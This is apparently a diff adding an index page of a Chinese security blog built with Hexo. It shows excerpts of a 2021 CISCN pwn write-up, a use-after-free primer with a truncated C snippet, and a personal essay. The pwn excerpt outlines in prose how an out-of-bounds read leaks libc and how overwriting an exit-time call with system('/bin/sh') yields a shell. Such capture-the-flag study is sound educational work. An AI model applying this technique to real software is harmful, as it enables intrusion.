+          2021CISCN_PWN题
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/06/05/2021CISCN-PWN%E9%A2%98/" target="_self">
+          
+          
+            
+          
+          大佬博客：https://nuoye-blog.github.io/2021/05/16/466a7375/
+pwnywrite的时候可以越界，第一次读入到0x202860处使fd非法，从而在第二次读入时会写入0，这样就可以做到写入操作。通过read越界读取出libc，然后越界写入system地址到exit退出时调用的地址，并将参数修改为/bin/sh，退出程序即可getshell。
+123456
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-06-06 10:13" pubdate>
+              2021-06-06
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/05/03/UAF%E6%BC%8F%E6%B4%9E/" target="_self">
+          UAF漏洞初探
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/05/03/UAF%E6%BC%8F%E6%B4%9E/" target="_self">
+          
+          
+            
+          
+          UAF原理上代码！！！
+12345678910111213#include&lt;stdio.h&gt;int main()&#123;	char *p1;	p1=(char *)malloc(sizeof(char)*10);	memcpy(p1,&quot;hello&quot;,10);	printf(&quot;p1 addr:%x,%s\n&quot;,p1,p1);	free(p1);
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-05-03 23:20" pubdate>
+              2021-05-03
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/05/02/%E4%BA%BA%E6%B4%BB%E7%9D%80%E5%B0%B1%E6%98%AF%E4%B8%BA%E4%BA%86%E2%80%94%E2%80%94%E5%8C%97%E4%BA%AC%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6/" target="_self">
+          人活着就是为了——北京邮电大学
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/05/02/%E4%BA%BA%E6%B4%BB%E7%9D%80%E5%B0%B1%E6%98%AF%E4%B8%BA%E4%BA%86%E2%80%94%E2%80%94%E5%8C%97%E4%BA%AC%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6/" target="_self">
+          
+          
+            
+          
+          与网络安全结缘高考填志愿都是十分随便的，分数踩上了就报了电子信息工程这个专业，好像还和计算机由那么一点点联系。填都填了那就读呗。刚刚进入大一，一切都是那么的新奇。大学校园摆脱了高中的枯燥，要协会有协会，要部门有部门，好玩的活动一大堆，于是抱着尝试新奇事物的心情开始了大学生涯。我本身爱好就十分广泛，就大一上个学期就玩遍了各种协会（网络安全协会也加了，那时候还沉寂着），加了一个部门，其中包括程序设计协
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-05-03 12:24" pubdate>
+              2021-05-03
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+
+
+  <nav aria-label="navigation">
+    <span class="pagination" id="pagination">
+      <a class="extend prev" rel="prev" href="/page/2/#board"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/#board">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/#board">4</a><a class="extend next" rel="next" href="/page/4/#board"><i class="iconfont icon-arrowright"></i></a>
+    </span>
+  </nav>
+
+
+
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
     
 
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-<script src="/js/jquery-3.4.1.min.js"></script>
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
 
 
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
 
 
 
 
 
-  </div>
+
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
 </body>
 </html>
